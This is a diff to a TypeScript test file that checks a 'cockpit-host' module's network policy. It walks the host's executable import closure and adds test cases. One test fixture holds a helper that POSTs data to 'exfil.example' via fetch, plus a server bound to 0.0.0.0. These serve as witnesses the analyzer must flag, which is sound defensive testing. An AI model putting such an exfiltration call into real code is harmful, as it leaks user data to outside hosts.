@@ -1,4 +1,5 @@
 import {
+  existsSync,
   lstatSync,
   mkdirSync,
   mkdtempSync,
@@ -16,6 +17,7 @@ import ts from 'typescript';
 import { afterAll, describe, expect, it } from 'vitest';
 
 import { analyzeNetworkPolicy, analyzeNetworkPolicyTree } from './support/d3-network-policy.js';
+import { EXPECTED_HOST_CLOSURE } from './support/host-closure.js';
 
 /**
  * Cockpit D3 host purity, bounded to `src/cockpit-host/`.
@@ -156,21 +158,82 @@ const ENCODED_SEPARATOR = /%2f|%5c/i;
  * round-trip is performed for its throwing side effect, so a bad escape is
  * rejected exactly as before).
  */
-const relativeImportStaysInBoundary = (importerRelPath: string, specifier: string): boolean => {
-  let resolvedUrl: URL;
+const resolveRelativeImport = (importerFileUrl: URL, specifier: string): URL | null => {
   try {
-    const importerFileUrl = pathToFileURL(join(hostDir, importerRelPath));
-    resolvedUrl = new URL(specifier, importerFileUrl);
-    if (ENCODED_SEPARATOR.test(resolvedUrl.pathname)) return false;
+    const resolvedUrl = new URL(specifier, importerFileUrl);
+    if (ENCODED_SEPARATOR.test(resolvedUrl.pathname)) return null;
     // Round-trip through `fileURLToPath` so a malformed percent escape (`%2`,
     // `%zz`) throws and fails closed, matching the real loader; the decoded path
     // is not otherwise needed because containment compares `file:` URLs.
     fileURLToPath(resolvedUrl);
+    return resolvedUrl;
   } catch {
-    return false;
+    return null;
   }
-  return isWithin(resolvedUrl, HOST_ROOT_URL) || isWithin(resolvedUrl, COCKPIT_BOUNDARY_URL);
 };
+
+const relativeImportStaysInBoundary = (importerRelPath: string, specifier: string): boolean => {
+  const resolvedUrl = resolveRelativeImport(pathToFileURL(join(hostDir, importerRelPath)), specifier);
+  return resolvedUrl !== null && (isWithin(resolvedUrl, HOST_ROOT_URL) || isWithin(resolvedUrl, COCKPIT_BOUNDARY_URL));
+};
+
+// The host's *executable* boundary is wider than its own directory: an allowed
+// `../cockpit/` import executes Cockpit code, which executes domain code. The
+// network policy must read exactly that closure (D3-NET boundary equality),
+// rooted at `src/` so `cockpit-host/server.ts` resolves `../cockpit/index.js`
+// to `cockpit/index.ts` inside the analyzed tree.
+const SRC_ROOT_URL = new URL('../', HOST_ROOT_URL);
+
+const isRelativeImportSpecifier = (specifier: string): boolean => specifier.startsWith('./') || specifier.startsWith('../');
+
+/** A `file:` URL under `src/` as the tree's '/'-separated, `src/`-relative name; anything else is outside the boundary. */
+const srcRelativeName = (fileUrl: URL): string => {
+  if (!isWithin(fileUrl, SRC_ROOT_URL)) throw new Error(`D3-NET: executable dependency leaves src/: ${fileUrl.href}`);
+  return decodeURIComponent(fileUrl.href.slice(SRC_ROOT_URL.href.length));
+};
+
+/** The `file:` URL of a tree name (the inverse of `srcRelativeName`). */
+const srcFileUrl = (name: string): URL => new URL(name.split('/').map(encodeURIComponent).join('/'), SRC_ROOT_URL);
+
+/**
+ * The closure member a runtime relative import executes: resolved through the one
+ * resolver, then the NodeNext `.js` specifier mapped to its `.ts` source. Throws
+ * when the import cannot be read as a `src/` source file — an executable
+ * dependency the tree cannot analyze is exactly the gap the closure closes.
+ */
+const closureMemberOf = (importerFileUrl: URL, specifier: string): string => {
+  const resolvedUrl = resolveRelativeImport(importerFileUrl, specifier);
+  if (resolvedUrl === null) throw new Error(`D3-NET: unresolvable runtime import ${specifier} from ${importerFileUrl.href}`);
+  const sourceUrl = new URL(resolvedUrl.href.replace(/\.js$/, '.ts').replace(/\.mjs$/, '.mts').replace(/\.cjs$/, '.cts'));
+  const name = srcRelativeName(sourceUrl);
+  if (!existsSync(fileURLToPath(sourceUrl))) {
+    throw new Error(`D3-NET: runtime import ${specifier} from ${importerFileUrl.href} has no source file ${name}`);
+  }
+  return name;
+};
+
+/**
+ * The host's executable import closure: every host source, then every runtime
+ * relative import of every member, transitively, each admitted only as a `src/`
+ * source file. `file` is `src/`-relative and '/'-separated — the tree entry's
+ * own form — so `analyzeNetworkPolicyTree` seeds a Cockpit export into its host
+ * importer exactly as it seeds a sibling host export. Bounded by the number of
+ * files under `src/`; a clause-level `import type` loads nothing and is skipped.
+ */
+function hostExecutableClosure(): readonly { readonly file: string; readonly text: string }[] {
+  const members = new Map<string, string>();
+  const queue = hostSources().map((source) => srcRelativeName(pathToFileURL(join(hostDir, source.file))));
+  for (let next = queue.shift(); next !== undefined; next = queue.shift()) {
+    if (members.has(next)) continue;
+    const fileUrl = srcFileUrl(next);
+    const text = readFileSync(fileURLToPath(fileUrl), 'utf8');
+    members.set(next, text);
+    for (const specifier of extractModuleSpecifiers(text, { runtimeOnly: true })) {
+      if (isRelativeImportSpecifier(specifier)) queue.push(closureMemberOf(fileUrl, specifier));
+    }
+  }
+  return [...members].map(([file, text]) => ({ file, text }));
+}
 
 // The host's production `node:*` needs are exactly these two (verified across
 // `src/cockpit-host/**`); every other builtin — `node:fs`, `node:child_process`,
@@ -223,7 +286,7 @@ const isAllowedNodeBuiltin = (specifier: string): boolean => ALLOWED_NODE_BUILTI
  * import site is a distinct occurrence. This is a pure syntactic parse — no
  * binder, type-checker, module resolution, or file-system access.
  */
-function extractModuleSpecifiers(source: string): readonly string[] {
+function extractModuleSpecifiers(source: string, options: { readonly runtimeOnly?: boolean } = {}): readonly string[] {
   const sourceFile = ts.createSourceFile(
     'module.ts',
     source,
@@ -242,8 +305,11 @@ function extractModuleSpecifiers(source: string): readonly string[] {
 
   const visit = (node: ts.Node): void => {
     if (ts.isImportDeclaration(node) || ts.isExportDeclaration(node)) {
+      // A clause-level `import type` / `export type` is erased by emit and loads
+      // nothing at runtime; the executable-closure walk skips it on request.
+      const typeOnly = ts.isImportDeclaration(node) ? node.importClause?.phaseModifier === ts.SyntaxKind.TypeKeyword : node.isTypeOnly;
       const specifier = stringLiteralText(node.moduleSpecifier);
-      if (specifier !== null) specifiers.push(specifier);
+      if (specifier !== null && !(options.runtimeOnly === true && typeOnly)) specifiers.push(specifier);
     } else if (ts.isImportEqualsDeclaration(node)) {
       // `import x = require('S')` — an external-module reference.
       if (ts.isExternalModuleReference(node.moduleReference)) {
@@ -3381,10 +3447,13 @@ describe('D3 host rejects symlink escapes under the Cockpit boundary (D3-CX-POLI
  */
 describe('D3 host network policy (D3-NET)', () => {
   it('accepts every real host source under the frozen network policy', () => {
-    // The tree entry seeds each file with the proven exports of the sibling host
+    // The tree entry seeds each file with the proven exports of the sibling
     // files it imports (server factories, string constants, string functions) and
-    // applies the server-instantiation site bound across the whole host tree.
-    const sources = hostSources();
+    // applies the server-instantiation site bound across the whole tree. The tree
+    // is the host's executable closure — host, Cockpit boundary, domain kernel —
+    // pinned so that a new executable dependency is enrolled explicitly.
+    const sources = hostExecutableClosure();
+    expect([...sources.map((source) => source.file)].sort()).toEqual([...EXPECTED_HOST_CLOSURE]);
     const results = analyzeNetworkPolicyTree(sources);
     expect(results.size).toBe(sources.length);
     for (const [file, result] of results) {
@@ -3395,6 +3464,59 @@ describe('D3 host network policy (D3-NET)', () => {
       expect(result.reasons, `${file}: ${detail}`).toEqual([]);
       expect(result.verdict, file).toBe('ALLOW');
     }
+  });
+
+  it('analyzes the executable closure, not the host directory: every runtime relative import resolves to a closure member', () => {
+    const closure = hostExecutableClosure();
+    const names = new Set(closure.map((source) => source.file));
+    expect(names.size).toBe(closure.length);
+    let imports = 0;
+    for (const { file, text } of closure) {
+      for (const specifier of extractModuleSpecifiers(text, { runtimeOnly: true })) {
+        if (!isRelativeImportSpecifier(specifier)) continue;
+        imports += 1;
+        const member = closureMemberOf(srcFileUrl(file), specifier);
+        expect(names.has(member), `${file} -> ${specifier} executes ${member}, which the tree does not read`).toBe(true);
+      }
+    }
+    expect(imports).toBeGreaterThan(0);
+    // The host reaches the Cockpit boundary and, through it, the domain kernel: both are in the tree, nothing else is.
+    expect(names.has('cockpit-host/server.ts')).toBe(true);
+    expect(names.has('cockpit/index.ts')).toBe(true);
+    expect(names.has('domain/evidence.ts')).toBe(true);
+    for (const name of names) {
+      expect(/^(cockpit-host|cockpit|domain)\//.test(name), name).toBe(true);
+    }
+    // A type-only import loads nothing: it neither adds a member nor counts as an executable edge.
+    expect(extractModuleSpecifiers(`import type { T } from './t.js';\nimport { v } from './v.js';\nexport type { U } from './u.js';`, { runtimeOnly: true })).toEqual(['./v.js']);
+    expect(extractModuleSpecifiers(`import type { T } from './t.js';\nimport { v } from './v.js';`)).toEqual(['./t.js', './v.js']);
+  });
+
+  it('denies an allowed ../cockpit helper that uses network or server authority (boundary witness)', () => {
+    const listener = `(request: http.IncomingMessage, response: http.ServerResponse) => { response.end('ok'); }`;
+    const cockpitNet = `export function send(body: string): void {\n  void fetch('https://exfil.example/', { method: 'POST', body });\n}`;
+    const cockpitFactory = `import http from 'node:http';\nexport function makeServer(): http.Server {\n  return http.createServer(${listener});\n}`;
+    const host = `import { send } from '../cockpit/net.js';\nimport { makeServer } from '../cockpit/server-factory.js';\nsend('snapshot');\nmakeServer().listen(4567, '0.0.0.0');`;
+    // The host directory alone cannot see the helpers, so the same host text is unprivileged: this is the gap.
+    const hostOnly = analyzeNetworkPolicyTree([{ file: 'cockpit-host/server.ts', text: host }]);
+    expect(hostOnly.get('cockpit-host/server.ts')?.verdict).toBe('ALLOW');
+    // The executable closure reads them, seeds the host importer, and judges every file under the one policy.
+    const closure = analyzeNetworkPolicyTree([
+      { file: 'cockpit-host/server.ts', text: host },
+      { file: 'cockpit/net.ts', text: cockpitNet },
+      { file: 'cockpit/server-factory.ts', text: cockpitFactory },
+    ]);
+    expect(closure.get('cockpit/net.ts')?.reasons).toEqual(['FREE_GLOBAL_NETWORK']);
+    expect(closure.get('cockpit/server-factory.ts')?.reasons).toEqual([]);
+    expect(closure.get('cockpit-host/server.ts')?.reasons).toEqual(['SERVER_LISTEN_BINDING']);
+    // Through the barrel and into the domain kernel — the real shape of the host's closure — the verdict is the same.
+    const viaBarrel = analyzeNetworkPolicyTree([
+      { file: 'cockpit-host/server.ts', text: `import { send } from '../cockpit/index.js';\nsend('snapshot');` },
+      { file: 'cockpit/index.ts', text: `export { send } from '../domain/exfil.js';` },
+      { file: 'domain/exfil.ts', text: cockpitNet },
+    ]);
+    expect(viaBarrel.get('domain/exfil.ts')?.reasons).toEqual(['FREE_GLOBAL_NETWORK']);
+    expect(viaBarrel.get('cockpit-host/server.ts')?.reasons).toEqual([]);
   });
 
   it('rejects a host that reaches outbound network or leaks server authority (witness)', () => {
